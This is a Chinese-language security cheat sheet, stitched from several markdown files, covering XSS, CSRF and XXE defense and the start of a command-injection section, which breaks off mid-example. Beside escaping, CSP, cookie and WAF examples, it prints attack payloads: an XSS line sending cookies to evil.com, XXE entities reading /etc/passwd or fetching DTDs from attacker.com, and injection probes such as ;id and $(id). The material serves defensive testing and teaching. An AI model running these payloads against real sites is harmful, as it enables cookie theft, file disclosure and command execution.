<!-- ============ 文档分隔线：033-cybersecurity/045-XSSDefense.md ============ -->


## XSS 攻击类型

**基本写法：反射型 XSS**
```html
`<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>`
```
```html
<!-- 反射型 XSS 载荷示例 -->
<script>alert(document.cookie)</script>
```

**基本写法：存储型 XSS**
```html
`<script>document.location='http://evil.com/?c='+document.cookie</script>`
```
```html
<!-- 存储型 XSS 窃取 Cookie -->
<script>document.location='http://evil.com/?c='+document.cookie</script>
```

**基本写法：DOM 型 XSS**
```javascript
`document.getElementById('output').innerHTML = location.hash`
```
```javascript
// DOM 型 XSS 漏洞代码
document.getElementById('output').innerHTML = location.hash.slice(1)
```

---

## XSS 测试载荷

**基本写法：常用测试载荷**
```html
`<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>`
```
```html
<!-- 常用 XSS 测试载荷 -->
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
```

**基本写法：编码绕过载荷**
```html
`<script>alert&#40;1&#41;</script>
<script>\u0061lert(1)</script>
<img src=x:alert(alt) onerror=eval(alt) alt=xss>
<svg><script>alert(1)</script></svg>`
```
```html
<!-- 编码绕过 XSS 载荷 -->
<script>alert&#40;1&#41;</script>
```

**基本写法：事件触发载荷**
```html
`<div onmouseover=alert(1)>hover</div>
<input onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>
<select onfocus=alert(1) autofocus>`
```
```html
<!-- 事件触发的 XSS 载荷 -->
<div onmouseover=alert(1)>hover me</div>
```

---

## HTML 实体编码

**基本写法：Python HTML 转义**
`html.escape(<字符串>)`
```python
# Python 转义 HTML 特殊字符
import html
safe = html.escape('<script>alert(1)</script>')
# 输出: &lt;script&gt;alert(1)&lt;/script&gt;
```

**基本写法：PHP htmlspecialchars**
`htmlspecialchars(<字符串>, ENT_QUOTES, 'UTF-8')`
```php
// PHP 转义 HTML 特殊字符
$safe = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

**基本写法：Java HTML 转义**
```java
`import org.apache.commons.text.StringEscapeUtils;
String safe = StringEscapeUtils.escapeHtml4(input);`
```
```java
// Java 使用 Apache Commons 转义 HTML
import org.apache.commons.text.StringEscapeUtils;
String safe = StringEscapeUtils.escapeHtml4(input);
```

**基本写法：JavaScript 转义**
`String(input).replace(/[&<>"']/g, char => map[char])`
```javascript
// JavaScript 转义 HTML
function escapeHtml(text) {
  const map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'};
  return text.replace(/[&<>"']/g, m => map[m]);
}
```

---

## CSP 内容安全策略

**基本写法：设置 CSP 头**
`Content-Security-Policy: default-src 'self'`
```http
# 基础 CSP 策略只允许同源资源
Content-Security-Policy: default-src 'self'
```

**基本写法：允许特定来源**
`Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com`
```http
# 允许同源和指定 CDN 的脚本
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

**基本写法：禁止内联脚本**
`Content-Security-Policy: script-src 'self'`
```http
# 禁止内联 script 标签和事件处理
Content-Security-Policy: script-src 'self'
```

**基本写法：使用 nonce 允许内联**
`Content-Security-Policy: script-src 'nonce-<随机值>'`
```http
# 使用 nonce 允许特定内联脚本
Content-Security-Policy: script-src 'nonce-abc123random456'
```

**基本写法：Nginx 配置 CSP**
```nginx
`add_header Content-Security-Policy "default-src 'self'; script-src 'self'";`
```
```nginx
# Nginx 配置 CSP 头
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'" always;
```

---

## HttpOnly Cookie

**基本写法：设置 HttpOnly Cookie**
`Set-Cookie: <键>=<值>; HttpOnly`
```http
# 设置 HttpOnly 防止 JS 读取 Cookie
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

**基本写法：PHP 设置 HttpOnly**
`setcookie(<名称>, <值>, [<选项>])`
```php
// PHP 设置 HttpOnly Cookie
setcookie('session', $value, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

**基本写法：Java 设置 HttpOnly**
```java
`Cookie cookie = new Cookie("session", value);
cookie.setHttpOnly(true);
cookie.setSecure(true);
response.addCookie(cookie);`
```
```java
// Java 设置 HttpOnly Cookie
Cookie cookie = new Cookie("session", value);
cookie.setHttpOnly(true);
cookie.setSecure(true);
response.addCookie(cookie);
```

**基本写法：Express 设置 HttpOnly**
```javascript
`res.cookie('session', value, { httpOnly: true, secure: true, sameSite: 'strict' })`
```
```javascript
// Express 设置 HttpOnly Cookie
res.cookie('session', value, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000
});
```

---

## 安全框架防御

**基本写法：Django 自动转义**
```python
`# Django 模板默认自动转义
{{ user_input }}

# 标记为安全内容
{{ user_input|safe }}`
```
```python
# Django 模板自动转义 HTML
{{ user_input }}
# 标记为安全内容（确认无 XSS 风险）
{{ user_input|safe }}
```

**基本写法：Jinja2 自动转义**
```python
`from jinja2 import Environment, select_autoescape
env = Environment(autoescape=select_autoescape(['html', 'xml']))`
```
```python
# Jinja2 启用自动转义
from jinja2 import Environment, select_autoescape
env = Environment(autoescape=select_autoescape(['html', 'xml']))
template = env.from_string('{{ user_input }}')
```

**基本写法：React 自动转义**
```jsx
`// React 默认转义
<div>{userInput}</div>

// 危险设置 HTML（不推荐）
<div dangerouslySetInnerHTML={{__html: userInput}} />`
```
```jsx
// React JSX 默认转义 HTML
<div>{userInput}</div>
// 危险设置 innerHTML（避免使用）
<div dangerouslySetInnerHTML={{__html: sanitizedHtml}} />
```

---

## 输入验证

**基本写法：白名单验证**
```python
`import re
if re.match(r'^[a-zA-Z0-9_]+$', username):
    # 安全处理`
```
```python
# 只允许字母数字下划线
import re
if re.match(r'^[a-zA-Z0-9_]+$', username):
    # 安全处理
```

**基本写法：长度限制**
```python
`username = username[:50]`
```
```python
# 限制输入长度
username = request.form.get('username', '')[:50]
```

**基本写法：HTML 标签过滤**
```python
`from bleach import clean
cleaned = clean(input, tags=['b', 'i', 'a'], attributes={'a': ['href']})`
```
```python
# 使用 bleach 过滤 HTML
from bleach import clean
cleaned = clean(user_input, tags=['b', 'i', 'a'], attributes={'a': ['href']})
```

---

## DOM 安全

**基本写法：使用 textContent 代替 innerHTML**
```javascript
`element.textContent = userInput`
```
```javascript
// 安全的 DOM 操作使用 textContent
element.textContent = userInput
```

**基本写法：使用 createElement**
```javascript
`const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);`
```
```javascript
// 安全创建 DOM 元素
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);
```

**基本写法：URL 验证**
```javascript
`function isSafeUrl(url) {
  return /^https?:\/\//.test(url) && !/^javascript:/.test(url);
}`
```
```javascript
// 验证 URL 防止 javascript: 协议
function isSafeUrl(url) {
  try {
    const u = new URL(url);
    return u.protocol === 'http:' || u.protocol === 'https:';
  } catch {
    return false;
  }
}
```

---

## DOMPurify 消毒

**基本写法：使用 DOMPurify 消毒**
```javascript
`import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHtml);`
```
```javascript
// 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
```

**基本写法：Node.js 使用 DOMPurify**
```javascript
`const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const DOMPurify = createDOMPurify(new JSDOM('').window);
const clean = DOMPurify.sanitize(dirty);`
```
```javascript
// Node.js 服务端使用 DOMPurify
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const DOMPurify = createDOMPurify(new JSDOM('').window);
const clean = DOMPurify.sanitize(dirtyHtml);
```

---

## XSS 检测与监控

**基本写法：日志检测 XSS 尝试**
```bash
`grep -iE "<script|onerror=|onload=|javascript:" /var/log/nginx/access.log`
```
```bash
# 检测日志中的 XSS 攻击特征
grep -iE "<script|onerror=|onload=|javascript:|<img.*src.*onerror" /var/log/nginx/access.log
```

**基本写法：统计 XSS 攻击来源**
```bash
`grep -iE "<script|onerror=" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn`
```
```bash
# 统计 XSS 攻击来源 IP
grep -iE "<script|onerror=|onload=" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

**基本写法：WAF 规则防御 XSS**
```apache
`SecRule ARGS "(?i)(<script|javascript:|onerror=|onload=)" "id:1002,phase:2,deny,status:403"`
```
```apache
# ModSecurity XSS 防御规则
SecRule ARGS "(?i)(<script|javascript:|onerror=|onload=|<img.*src.*onerror)" "id:1002,phase:2,deny,status:403"
```



<!-- ============ 文档分隔线：033-cybersecurity/046-CSRFDefense.md ============ -->


## CSRF Token 生成与校验

**基本写法:生成随机 CSRF Token**
`openssl rand -hex <字节数>`
```bash
# 生成 32 字节的随机 CSRF Token
openssl rand -hex 32
```

**基本写法:生成 Base64 格式 Token**
`openssl rand -base64 <字节数>`
```bash
# 生成 Base64 编码的 Token
openssl rand -base64 48
```

**基本写法:使用 urandom 生成 Token**
`head -c <字节数> /dev/urandom | xxd -p`
```bash
# 从 /dev/urandom 读取随机字节并转十六进制
head -c 32 /dev/urandom | xxd -p
```

**基本写法:Python 生成 Token**
`python3 -c "import secrets; print(secrets.token_hex(<字节数>))"`
```bash
# 使用 secrets 模块生成安全 Token
python3 -c "import secrets; print(secrets.token_hex(32))"
```

**基本写法:校验 Token 长度**
`echo -n "<Token>" | wc -c`
```bash
# 检查 Token 字符长度是否符合要求
echo -n "a1b2c3d4e5f6" | wc -c
```

---

## Nginx CSRF 防护配置

**基本写法:校验 Origin 头**
`if ($http_origin !~* "^https://example\.com$") { return 403; }`
```bash
# Nginx 校验请求来源 Origin 头
if ($http_origin !~* "^https://example\.com$") {
    return 403;
}
```

**基本写法:校验 Referer 头**
`valid_referers none blocked server_names example.com; if ($invalid_referer) { return 403; }`
```bash
# Nginx 配置 Referer 校验防止 CSRF
valid_referers none blocked server_names example.com *.example.com;
if ($invalid_referer) {
    return 403;
}
```

**基本写法:设置 SameSite Cookie**
`proxy_cookie_path / "/; SameSite=Strict; Secure; HttpOnly";`
```bash
# 通过反向代理改写 Cookie 添加 SameSite 属性
proxy_cookie_path / "/; SameSite=Strict; Secure; HttpOnly";
```

**基本写法:添加自定义响应头**
`add_header X-Frame-Options "SAMEORIGIN" always;`
```bash
# 添加 X-Frame-Options 防止点击劫持配合 CSRF
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
```

---

## Apache CSRF 防护配置

**基本写法:启用 Referer 校验**
`SetEnvIf Referer "^https://example\.com/" local_ref=1`
```bash
# Apache 仅允许本站 Referer 访问
SetEnvIf Referer "^https://example\.com/" local_ref=1
Order Deny,Allow
Deny from all
Allow from env=local_ref
```

**基本写法:配置 SameSite Cookie**
`Header always edit Set-Cookie ^(.*)$ "$1; SameSite=Strict; Secure"`
```bash
# 强制为所有 Cookie 添加 SameSite 属性
Header always edit Set-Cookie ^(.*)$ "$1; SameSite=Strict; Secure"
```

**基本写法:禁用跨域嵌入**
`Header always set X-Frame-Options "SAMEORIGIN"`
```bash
# 禁止页面被嵌入跨域 iframe
Header always set X-Frame-Options "SAMEORIGIN"
```

**基本写法:CSRF Token 头校验**
`RewriteCond %{HTTP:X-CSRF-Token} ^$`
```bash
# 强制请求必须携带 X-CSRF-Token 头
RewriteCond %{HTTP:X-CSRF-Token} ^$
RewriteRule ^api/ - [F]
```

---

## Cookie 安全属性配置

**基本写法:查看当前 Cookie 属性**
`curl -I <URL> | grep -i set-cookie`
```bash
# 检查响应中的 Cookie 安全属性
curl -I https://example.com | grep -i set-cookie
```

**基本写法:测试 SameSite 属性**
`curl -s -I -H "Origin: https://evil.com" <URL>`
```bash
# 模拟跨域请求检查 Cookie 是否被发送
curl -s -I -H "Origin: https://evil.com" https://example.com
```

**基本写法:Python 设置安全 Cookie**
`python3 -c "print('Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly')"`
```bash
# 输出符合安全规范的 Cookie 头
python3 -c "print('Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly')"
```

**基本写法:批量检查 Cookie 配置**
`curl -s -I <URL> | grep -i "set-cookie\|csrf"`
```bash
# 一次性检查 Cookie 与 CSRF 相关响应头
curl -s -I https://example.com | grep -i "set-cookie\|csrf\|x-frame"
```

---

## CSRF 漏洞检测命令

**基本写法:检测表单是否含 Token**
`curl -s <URL> | grep -i "csrf\|token\|authenticity"`
```bash
# 抓取页面查找 CSRF Token 字段
curl -s https://example.com/login | grep -i "csrf\|token\|authenticity"
```

**基本写法:测试无 Token 的 POST 请求**
`curl -X POST <URL> -d "username=admin&password=test"`
```bash
# 测试 POST 是否需要 Token 校验
curl -X POST https://example.com/api/transfer -d "amount=1000&to=attacker"
```

**基本写法:跨域请求模拟**
`curl -X POST <URL> -H "Origin: https://evil.com" -H "Referer: https://evil.com/"`
```bash
# 模拟恶意跨域请求测试 CSRF 防护
curl -X POST https://example.com/api/delete -H "Origin: https://evil.com" -H "Referer: https://evil.com/" -d "id=1"
```

**基本写法:使用 wget 抓取表单分析**
`wget -qO- <URL> | grep -oE 'name="[^"]*"'`
```bash
# 分析表单字段判断是否有 CSRF 防护
wget -qO- https://example.com/form | grep -oE 'name="[^"]*"'
```

---

## OWASP ZAP CSRF 扫描

**基本写法:命令行启动 ZAP 扫描**
`zap-cli quick-scan <URL>`
```bash
# 使用 OWASP ZAP 命令行快速扫描
zap-cli quick-scan https://example.com
```

**基本写法:运行 CSRF 规则**
`zap-cli active-scan -s 10202 <URL>`
```bash
# 仅运行 CSRF 扫描规则(规则 ID 10202)
zap-cli active-scan -s 10202 https://example.com
```

**基本写法:导出扫描报告**
`zap-cli report -f <格式> -o <输出文件>`
```bash
# 导出 HTML 格式扫描报告
zap-cli report -f html -o csrf-report.html
```

**基本写法:守护模式启动 ZAP**
`zap-cli start -p <端口>`
```bash
# 以守护进程方式启动 ZAP 代理
zap-cli start -p 8080
```

---

## Django CSRF 配置

**基本写法:查看 Django CSRF 设置**
`python3 -c "import django.conf; print(getattr(django.conf.settings, 'CSRF_COOKIE_NAME', None))"`
```bash
# 查看 Django 项目 CSRF Cookie 名称配置
python3 -c "import django.conf; print(getattr(django.conf.settings, 'CSRF_COOKIE_NAME', None))"
```

**基本写法:生成 Django CSRF Token**
`python3 -c "from django.middleware.csrf import get_token; print(get_token(request))"`
```bash
# 在视图函数中获取 CSRF Token(需在请求上下文中)
python3 -c "from django.middleware.csrf import get_token; print(get_token(request))"
```

**基本写法:校验 Django CSRF 中间件**
`grep -i csrf <Django配置>`
```bash
# 检查 settings.py 中 CSRF 中间件是否启用
grep -i csrf settings.py
```

**基本写法:测试 Django CSRF 校验**
`curl -X POST <URL> -H "X-CSRFToken: <Token>" -H "Cookie: csrftoken=<Token>"`
```bash
# 携带 CSRF Token 测试 POST 请求
curl -X POST http://localhost:8000/form -H "X-CSRFToken: abc123" -H "Cookie: csrftoken=abc123" -d "data=test"
```

---

## Rails CSRF 配置

**基本写法:检查 Rails CSRF 配置**
`grep -i "protect_from_forgery" <控制器文件>`
```bash
# 检查 Rails 控制器是否启用 CSRF 防护
grep -i "protect_from_forgery" app/controllers/application_controller.rb
```

**基本写法:生成 Rails CSRF Token**
`ruby -e "require 'securerandom'; puts SecureRandom.hex(32)"`
```bash
# 使用 Ruby 生成 CSRF Token
ruby -e "require 'securerandom'; puts SecureRandom.hex(32)"
```

**基本写法:Rails 测试 CSRF 例外**
`grep -i "skip_before_action :verify_authenticity_token" <文件>`
```bash
# 查找被豁免 CSRF 校验的控制器
grep -ri "skip_before_action :verify_authenticity_token" app/controllers/
```

**基本写法:Rails 检查 Token 蒙版**
`grep -i "form_authenticity_token" <视图文件>`
```bash
# 检查表单中是否包含 CSRF Token
grep -ri "form_authenticity_token\|csrf_meta_tags" app/views/
```

---

## Express(Node.js)CSRF 防护

**基本写法:安装 csurf 中间件**
`npm install csurf`
```bash
# 安装 Express CSRF 防护中间件
npm install csurf
```

**基本写法:检查 csurf 配置**
`grep -ri "csurf\|csrf" <项目目录>`
```bash
# 检查 Express 项目是否配置 CSRF 防护
grep -ri "csurf\|csrf" src/
```

**基本写法:生成 Express CSRF Token**
`node -e "const crypto=require('crypto'); console.log(crypto.randomBytes(32).toString('hex'))"`
```bash
# 使用 Node.js crypto 生成 Token
node -e "const crypto=require('crypto'); console.log(crypto.randomBytes(32).toString('hex'))"
```

**基本写法:测试 Express CSRF 中间件**
`curl -X POST <URL> -H "x-csrf-token: <Token>"`
```bash
# 携带 CSRF Token 测试 Express API
curl -X POST http://localhost:3000/api -H "x-csrf-token: abc123" -d "data=test"
```

---

## CSRF 日志审计

**基本写法:统计 CSRF 校验失败**
`grep -i "csrf\|forgery" <访问日志> | wc -l`
```bash
# 统计 Nginx 日志中 CSRF 相关失败次数
grep -i "csrf\|forgery" /var/log/nginx/access.log | wc -l
```

**基本写法:提取 CSRF 攻击源 IP**
`grep -i "csrf" <日志> | awk '{print $1}' | sort | uniq -c | sort -rn`
```bash
# 提取 CSRF 失败请求的来源 IP 排行
grep -i "csrf" /var/log/nginx/error.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

**基本写法:监控跨域异常请求**
`tail -f <日志> | grep -i "origin.*evil\|referer.*external"`
```bash
# 实时监控可疑的跨域请求
tail -f /var/log/nginx/access.log | grep -i "origin.*evil\|referer.*external"
```

**基本写法:统计 Referer 异常**
`awk -F'"' '{print $6}' <日志> | grep -v "<合法域名>" | sort | uniq -c`
```bash
# 统计非本站 Referer 的请求
awk -F'"' '{print $6}' /var/log/nginx/access.log | grep -v "example.com" | sort | uniq -c | sort -rn | head
```

---

## CSRF 防护自检脚本

**基本写法:批量检查站点 Cookie**
`for url in <URL列表>; do echo "$url: $(curl -sI $url | grep -i set-cookie)"; done`
```bash
# 批量检查多个站点 Cookie 安全属性
for url in https://a.com https://b.com; do echo "$url: $(curl -sI $url | grep -i set-cookie)"; done
```

**基本写法:检查表单 Token 覆盖率**
`curl -s <URL> | grep -c "csrf\|authenticity_token"`
```bash
# 统计页面中包含 CSRF Token 的表单数量
curl -s https://example.com | grep -c "csrf\|authenticity_token"
```

**基本写法:自动化 CSRF 检测**
`curl -s -X POST <URL> -H "Origin: https://evil.com" -w "%{http_code}" -o /dev/null`
```bash
# 检查跨域 POST 请求返回状态码判断防护
curl -s -X POST https://example.com/api -H "Origin: https://evil.com" -w "%{http_code}" -o /dev/null
```

**基本写法:检查响应头安全配置**
`curl -sI <URL> | grep -iE "x-frame|x-content|set-cookie"`
```bash
# 一次性检查 CSRF 相关安全响应头
curl -sI https://example.com | grep -iE "x-frame|x-content|set-cookie|strict-transport"
```



<!-- ============ 文档分隔线：033-cybersecurity/047-XXEDefense.md ============ -->


## XXE 漏洞检测

**基本写法:发送 XML 实体探测请求**
`curl -X POST -H "Content-Type: application/xml" -d '<payload>' <URL>`
```bash
# 发送包含外部实体的探测 XML
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' https://example.com/api
```

**基本写法:盲 XXE OOB 检测**
`curl -X POST -d '<payload>' <URL>`
```bash
# 带外数据(OOB)盲 XXE 探测
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>' https://example.com/api
```

**基本写法:检查 XML 解析是否报错**
`curl -X POST -d '<malformed>' <URL> -v`
```bash
# 发送畸形 XML 观察错误回显判断解析器
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><foo' https://example.com/api -v
```

**基本写法:测试参数实体**
`curl -X POST -d '<payload>' <URL>`
```bash
# 测试是否支持参数实体 %param
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/detect">%xxe;]><foo>test</foo>' https://example.com/api
```

---

## Java XXE 防护配置

**基本写法:禁用外部实体(Java SAX)**
`factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
```bash
# Java SAXParserFactory 禁用 DOCTYPE 声明
# factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
```

**基本写法:禁用外部实体加载**
`factory.setFeature("http://xml.org/sax/features/external-general-entities", false)`
```bash
# 关闭通用外部实体与参数实体
# factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
# factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false)
```

**基本写法:检查 Java 项目是否使用安全 XML**
`grep -r "DocumentBuilderFactory\|SAXParserFactory" <项目目录>`
```bash
# 查找项目中的 XML 解析器使用位置
grep -rn "DocumentBuilderFactory\|SAXParserFactory" src/main/java/
```

**基本写法:Python 安全 XML 解析**
`python3 -c "import defusedxml.ElementTree as ET; ET.parse('<文件>')"`
```bash
# 使用 defusedxml 替代标准库防御 XXE
python3 -c "import defusedxml.ElementTree as ET; ET.parse('input.xml')"
```

**基本写法:Python 标准库禁用实体**
`python3 -c "import xml.etree.ElementTree as ET; parser=ET.XMLParser(); print(parser)"`
```bash
# 检查 Python XML 解析器配置
python3 -c "import xml.etree.ElementTree as ET; parser=ET.XMLParser(resolve_entities=False); print(parser)"
```

---

## PHP XXE 防护配置

**基本写法:检查 libxml 版本**
`php -r "echo LIBXML_VERSION;"`
```bash
# 查看 PHP libxml 版本(2.9+ 默认禁用外部实体)
php -r "echo LIBXML_VERSION;"
```

**基本写法:PHP 禁用实体加载**
`libxml_disable_entity_loader(true)`
```bash
# PHP 中显式禁用外部实体加载
# libxml_disable_entity_loader(true);
```

**基本写法:检查 PHP XML 解析配置**
`php -i | grep -i "libxml\|entity"`
```bash
# 查看 PHP 环境的 libxml 配置
php -i | grep -i "libxml\|entity"
```

**基本写法:PHP 安全解析 XML**
`php -r "libxml_disable_entity_loader(true); $d=new DOMDocument(); $d->loadXML('<x/>');"`
```bash
# PHP DOMDocument 安全加载
php -r "libxml_disable_entity_loader(true); \$d=new DOMDocument(); \$d->loadXML('<x/>', LIBXML_NONET); echo \$d->saveXML();"
```

---

## .NET XXE 防护配置

**基本写法:.NET XmlReader 安全设置**
`XmlReaderSettings settings = new XmlReaderSettings()`
```bash
# .NET 中通过 XmlReaderSettings 防护
# settings.DtdProcessing = DtdProcessing.Prohibit
```

**基本写法:检查 .NET 项目 XML 配置**
`grep -r "XmlReader\|XmlDocument\|XDocument" <项目目录>`
```bash
# 查找 .NET 项目中 XML 处理代码
grep -rn "XmlReader\|XmlDocument\|XDocument" src/
```

**基本写法:.NET Core 默认安全检查**
`dotnet --list-runtimes`
```bash
# 查看 .NET 运行时版本判断默认防护
dotnet --list-runtimes
```

---

## XXE Payload 构造(检测用)

**基本写法:读取文件 payload**
`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///<路径>">]>`
```bash
# 构造读取本地文件的 XXE payload
cat > payload.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
EOF
```

**基本写法:SSRF 探测 payload**
`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<内网IP>">]>`
```bash
# 利用 XXE 探测内网服务
cat > ssrf.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/admin">]>
<foo>&xxe;</foo>
EOF
```

**基本写法:编码绕过 payload**
`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/<路径>">]>`
```bash
# 使用 PHP filter 读取文件并 Base64 编码
cat > b64.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
<foo>&xxe;</foo>
EOF
```

**基本写法:OOB 外部 DTD payload**
`<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://<攻击服务器>/<evil.dtd>"> %ext; ]>`
```bash
# 带外数据外传的盲 XXE payload
cat > oob.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext; ]>
<foo>test</foo>
EOF
```

---

## XXE 检测工具

**基本写法:使用 XXExploiter 生成 payload**
`python3 xxexploiter.py file --xml --file <目标文件>`
```bash
# 使用 XXExploiter 生成 XXE payload
python3 xxexploiter.py file --xml --file /etc/passwd --output payload
```

**基本写法:使用 xxeinjector 批量检测**
`ruby XXEinjector.rb --file <请求文件> --oob http`
```bash
# XXEinjector 进行 OOB 检测
ruby XXEinjector.rb --file request.txt --oob http --http 8080
```

**基本写法:启动监听接收外带数据**
`python3 -m http.server <端口>`
```bash
# 启动 HTTP 服务接收带外数据
python3 -m http.server 8080
```

**基本写法:Burp Collaborator 检测**
`curl -X POST -H "Content-Type: application/xml" -d '<payload>' <URL>`
```bash
# 使用 Burp Collaborator 地址进行盲 XXE 检测
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "http://xxx.collaborator.net">]><foo>&x;</foo>' https://example.com/api
```

---

## Nginx/Apache XXE 防护

**基本写法:Nginx 拦截含 DOCTYPE 请求**
`if ($request_body ~* "<!DOCTYPE") { return 403; }`
```bash
# Nginx 拦截包含 DOCTYPE 的 XML 请求
if ($request_body ~* "<!DOCTYPE") {
    return 403;
}
```

**基本写法:Nginx 限制 XML 请求体大小**
`client_body_buffer_size <大小>; client_max_body_size <大小>;`
```bash
# 限制 XML 请求体大小缓解 XXE 攻击
client_body_buffer_size 1k;
client_max_body_size 2k;
```

**基本写法:Apache 拦截外部实体**
`SecRule REQUEST_BODY "!DOCTYPE" ...`
```bash
# Apache ModSecurity 拦截 DOCTYPE 声明
SecRule REQUEST_BODY "@contains <!DOCTYPE" "id:1001,deny,status:403"
```

**基本写法:ModSecurity XXE 规则**
`SecRule REQUEST_BODY "@rx <!ENTITY.*SYSTEM" "deny"`
```bash
# ModSecurity 拦截 ENTITY SYSTEM 声明
SecRule REQUEST_BODY "@rx <!ENTITY\s+.*SYSTEM" "id:1002,deny,status:403,log,msg:'XXE Attack Detected'"
```

---

## XXE 日志审计

**基本写法:检索 XML 请求日志**
`grep -i "application/xml\|text/xml" <访问日志>`
```bash
# 查找所有 XML 类型的请求
grep -i "application/xml\|text/xml" /var/log/nginx/access.log
```

**基本写法:检索含 ENTITY 的可疑请求**
`grep -i "ENTITY\|DOCTYPE" <访问日志>`
```bash
# 检索包含外部实体声明的可疑请求
grep -i "ENTITY\|DOCTYPE" /var/log/nginx/access.log
```

**基本写法:统计 XXE 攻击来源**
`grep -i "DOCTYPE.*ENTITY" <日志> | awk '{print $1}' | sort | uniq -c`
```bash
# 统计 XXE 攻击来源 IP
grep -i "DOCTYPE.*ENTITY" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

**基本写法:监控外部实体加载**
`grep -i "file://\|http://.*dtd" <日志>`
```bash
# 监控通过 XXE 加载外部资源的行为
grep -i "file://\|http://.*\.dtd" /var/log/nginx/access.log
```

---

## XXE 防护自检

**基本写法:检测站点 XML 端点**
`curl -s -X POST -H "Content-Type: application/xml" -d '<x/>' -w "%{http_code}" <URL>`
```bash
# 检测接口是否接受 XML 输入
curl -s -X POST -H "Content-Type: application/xml" -d '<x/>' -w "%{http_code}" https://example.com/api -o /dev/null
```

**基本写法:批量检查 XML 端点防护**
`for url in <URL列表>; do curl -s -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE x [<!ENTITY a SYSTEM "file:///etc/hostname">]><x>&a;</x>' "$url"; done`
```bash
# 批量检测多个接口是否存在 XXE
for url in https://a.com/api https://b.com/api; do
  echo "$url: $(curl -s -X POST -H 'Content-Type: application/xml' -d '<!DOCTYPE x [<!ENTITY a SYSTEM "file:///etc/hostname">]><x>&a;</x>' "$url" | head -c 100)"
done
```

**基本写法:验证外部实体是否被禁用**
`curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>' <URL>`
```bash
# 验证目标是否正确禁用外部实体
curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>' https://example.com/api
```

**基本写法:代码扫描 XML 解析器**
`grep -rn "XMLReader\|SAXParser\|XmlDocument\|DocumentBuilder" <项目目录> --include=*.java`
```bash
# Java 项目扫描 XML 解析器使用情况
grep -rn "XMLReader\|SAXParser\|XmlDocument\|DocumentBuilder" src/ --include=*.java
```



<!-- ============ 文档分隔线：033-cybersecurity/048-CommandInjection.md ============ -->


## 命令注入原理检测

**基本写法:常见分隔符探测**
`<输入>; <命令> | <输入> | <命令>`
```bash
# 探测命令分隔符是否生效
;id
|id
`id`
$(id)
&&id
||id
```

**基本写法:测试命令注入回显**
`curl -s "<URL>?param=;id"`
```bash
# 通过 URL 参数测试命令注入回显
curl -s "https://example.com/ping?host=127.0.0.1;id"
```

**基本写法:测试延迟型注入**
`curl -s "<URL>?param=;sleep+5"`
```bash
# 通过 sleep 命令验证盲注入
time curl -s "https://example.com/ping?host=127.0.0.1;sleep+5"
```

**基本写法:DNS 带外检测**
`curl -s "<URL>?param=;nslookup+<子域>.<攻击域名>"`
```bash
# 通过 DNS 查询外带命令执行结果
